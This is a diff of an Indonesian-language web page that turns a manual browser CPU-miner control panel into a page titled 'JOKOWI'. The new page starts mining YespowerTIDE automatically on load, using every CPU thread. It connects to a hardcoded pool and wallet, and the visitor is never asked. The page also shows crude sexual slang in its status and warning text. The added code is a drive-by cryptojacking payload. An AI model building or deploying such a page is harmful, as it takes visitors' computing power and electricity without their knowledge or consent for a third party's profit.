@@ -1,150 +1,247 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>cpu-web-miner — Apache Control</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: #0f172a;
-      color: #e5e7eb;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-      margin: 0;
-    }
-    .card {
-      background: #1e293b;
-      padding: 20px;
-      border-radius: 12px;
-      box-shadow: 0 6px 16px rgba(0,0,0,0.5);
-      width: 400px;
-    }
-    h1 {
-      font-size: 20px;
-      margin-bottom: 12px;
-    }
-    label { display:block; margin:8px 0 4px; font-size:14px; }
-    input, select {
-      width: 100%;
-      padding: 8px;
-      border-radius: 6px;
-      border: 1px solid #334155;
-      background: #0f172a;
-      color: #e5e7eb;
-    }
-    button {
-      margin-top: 12px;
-      padding: 10px;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-      font-weight: bold;
-    }
-    .btn-primary { background: #6366f1; color:white; }
-    .btn-secondary { background: #475569; color:white; }
-    #log {
-      margin-top: 12px;
-      padding: 10px;
-      background: #0f172a;
-      border-radius: 6px;
-      max-height: 150px;
-      overflow: auto;
-      font-size: 12px;
-      white-space: pre-wrap;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>JOkOWI</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #1a2a6c, #2a4b8c);
+            color: #fff;
+            min-height: 100vh;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .container {
+            max-width: 800px;
+            background-color: rgba(0, 0, 0, 0.6);
+            border-radius: 15px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            text-align: center;
+        }
+        
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 20px;
+            background: linear-gradient(to right, #4facfe, #00f2fe);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .status {
+            font-size: 1.2rem;
+            margin: 20px 0;
+            padding: 15px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+        }
+        
+        .hash-rate {
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: #00f2fe;
+            margin: 15px 0;
+        }
+        
+        .log-container {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+            padding: 20px;
+            height: 200px;
+            overflow-y: auto;
+            margin-top: 20px;
+            text-align: left;
+            font-family: monospace;
+            font-size: 0.9rem;
+        }
+        
+        .log-entry {
+            padding: 5px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .warning {
+            background: rgba(255, 165, 0, 0.2);
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 20px;
+            border-left: 4px solid orange;
+        }
+        
+        .progress-bar {
+            height: 10px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 5px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+        
+        .progress {
+            height: 100%;
+            background: linear-gradient(to right, #4facfe, #00f2fe);
+            width: 0%;
+            transition: width 0.5s ease;
+        }
+        
+        button {
+            padding: 12px 25px;
+            border: none;
+            border-radius: 50px;
+            font-size: 1rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin: 10px;
+        }
+        
+        #stopBtn {
+            background: linear-gradient(to right, #ff416c, #ff4b2b);
+            color: white;
+        }
+        
+        button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        }
+        
+        button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+    </style>
 </head>
 <body>
-  <div class="card">
-    <h1>cpu-web-miner</h1>
-
-    <label>Server</label>
-    <input id="server" type="text" value="europe.raptoreum.zone">
-
-    <label>Port</label>
-    <input id="port" type="number" value="3333">
-
-    <label>Worker (wallet)</label>
-    <input id="worker" type="text" value="RY3WyocxKLRPFGKkUX8jvRyyRKBJaugFd5">
-
-    <label>Password</label>
-    <input id="password" type="text" value="x">
-
-    <label>SSL</label>
-    <select id="ssl">
-      <option value="false" selected>No</option>
-      <option value="true">Yes</option>
-    </select>
-
-    <label>Threads</label>
-    <input id="threads" type="text" value="ALL_THREADS">
-
-    <div style="display:flex;gap:8px;">
-      <button id="startBtn" class="btn-primary" style="flex:1;">Start</button>
-      <button id="stopBtn" class="btn-secondary" style="flex:1;">Stop</button>
+    <div class="container">
+        <h1>JOKOWI</h1>
+        <div class="status" id="status">MEMULAI COLI DENGAN INPSIRE....</div>
+        <div class="hash-rate" id="hashRate">Hash Rate: 0 H/s</div>
+        
+        <div class="progress-bar">
+            <div class="progress" id="miningProgress"></div>
+        </div>
+        
+        <button id="stopBtn" disabled>Berhenti Mining</button>
+        
+        <div class="warning">
+            <strong>Peringatan:</strong> COLI MENYEBABKAN KONTOL SAKIT</div>
+        
+        <div class="log-container" id="logContainer">
+            <div class="log-entry">Menginisialisasi miner...</div>
+        </div>
     </div>
 
-    <div id="status" style="margin-top:12px;font-weight:bold;">Stopped</div>
-    <div id="hashrate">0 H/s</div>
+    <script type="module">
+        import * as cpuWebMiner from 'https://esm.run/@marco_ciaramella/cpu-web-miner';
 
-    <div id="log"></div>
-  </div>
-
-  <script type="module">
-    import * as cpuWebMiner from './js/cpu-web-miner.js';
-
-    let minerInstance = null;
-
-    const $ = id => document.getElementById(id);
-    function log(msg) {
-      $('log').textContent = new Date().toLocaleTimeString()+" — "+msg+"\n"+$('log').textContent;
-    }
-
-    $('startBtn').addEventListener('click', () => {
-      const stratum = {
-        server: $('server').value,
-        port: parseInt($('port').value),
-        worker: $('worker').value,
-        password: $('password').value,
-        ssl: ($('ssl').value === "true")
-      };
-      const threads = ($('threads').value === "ALL_THREADS") ? cpuWebMiner.ALL_THREADS : parseInt($('threads').value);
-
-      minerInstance = cpuWebMiner.start(
-        cpuWebMiner.ghostrider,
-        stratum,
-        null,
-        threads,
-        work => log("work: "+JSON.stringify(work)),
-        hashrate => {
-          $('hashrate').textContent = hashrate.total+" H/s";
-          log("hashrate: "+hashrate.total+" H/s");
-        },
-        error => log("error: "+error)
-      );
-
-      $('status').textContent = "Running";
-      log("Miner started");
-    });
-
-    $('stopBtn').addEventListener('click', () => {
-      try {
-        if(minerInstance && typeof minerInstance.stop === "function") {
-          minerInstance.stop();
-          log("Miner stopped (instance)");
-        } else if(cpuWebMiner && typeof cpuWebMiner.stop === "function") {
-          cpuWebMiner.stop();
-          log("Miner stopped (module)");
+        // Konfigurasi untuk YespowerTIDE
+        const stratum = {
+            server: "asia.rplant.xyz",
+            port: 7059,
+            worker: "EaGKnFyMFmkcGjmMuPhjcys9v8kNeZLS3Z.dotaja", // Ganti dengan wallet address Anda
+            password: "x",
+            ssl: false
         }
-      } catch(e) {
-        log("Stop error: "+e);
-      }
-      $('status').textContent = "Stopped";
-      $('hashrate').textContent = "0 H/s";
-    });
-  </script>
+
+        // Elemen UI
+        const statusElement = document.getElementById('status');
+        const hashRateElement = document.getElementById('hashRate');
+        const logContainer = document.getElementById('logContainer');
+        const stopBtn = document.getElementById('stopBtn');
+        const progressBar = document.getElementById('miningProgress');
+
+        let isMining = true;
+        let startTime = Date.now();
+
+        function addLog(message, type = 'info') {
+            const logEntry = document.createElement('div');
+            logEntry.className = 'log-entry';
+            logEntry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+            
+            if (type === 'error') logEntry.style.color = '#ff6b6b';
+            if (type === 'success') logEntry.style.color = '#51cf66';
+            
+            logContainer.appendChild(logEntry);
+            logContainer.scrollTop = logContainer.scrollHeight;
+        }
+
+        function updateProgress() {
+            if (!isMining) return;
+            
+            const elapsed = Date.now() - startTime;
+            const progress = (elapsed % 30000) / 300; // Reset setiap 30 detik
+            progressBar.style.width = `${progress}%`;
+        }
+
+        // Callback untuk menerima pekerjaan baru
+        function onWork(work) {
+            addLog(`Pekerjaan baru diterima: ${work.job_id}`);
+        }
+
+        // Callback untuk update hash rate
+        function onHashrate(hashrate) {
+            hashRateElement.textContent = `Hash Rate: ${hashrate.toFixed(2)} H/s`;
+            statusElement.textContent = 'Mining aktif...';
+            stopBtn.disabled = false;
+        }
+
+        // Callback untuk error
+        function onError(error) {
+            addLog(`Error: ${error}`, 'error');
+            statusElement.textContent = 'Error terjadi';
+        }
+
+        // Mulai mining otomatis saat halaman dimuat
+        try {
+            addLog('Menghubungkan ke pool mining...');
+            
+            cpuWebMiner.start(
+                cpuWebMiner.yespowerTIDE, // Menggunakan algoritma yespower untuk TIDE
+                stratum,
+                null,
+                cpuWebMiner.ALL_THREADS,
+                onWork,
+                onHashrate,
+                onError
+            );
+            
+            addLog('Mining dimulai! Menggunakan semua thread CPU', 'success');
+            addLog(`Pool: ${stratum.server}:${stratum.port}`);
+            addLog(`Worker: kontol sakti dotaja`);
+            
+            // Update progress bar setiap detik
+            setInterval(updateProgress, 1000);
+            
+        } catch (error) {
+            addLog(`Gagal memulai mining: ${error.message}`, 'error');
+            statusElement.textContent = 'Gagal memulai mining';
+        }
+
+        // Tombol stop mining
+        stopBtn.addEventListener('click', () => {
+            if (isMining) {
+                cpuWebMiner.stop();
+                isMining = false;
+                statusElement.textContent = 'Mining dihentikan';
+                stopBtn.disabled = true;
+                addLog('Mining dihentikan oleh pengguna', 'success');
+                progressBar.style.width = '0%';
+            }
+        });
+
+        // Tambahkan info sistem
+        addLog(`CPU threads tersedia: ${navigator.hardwareConcurrency || 'Tidak diketahui'}`);
+        addLog('Mining YespowerTIDE aktif...');
+    </script>
 </body>
 </html>
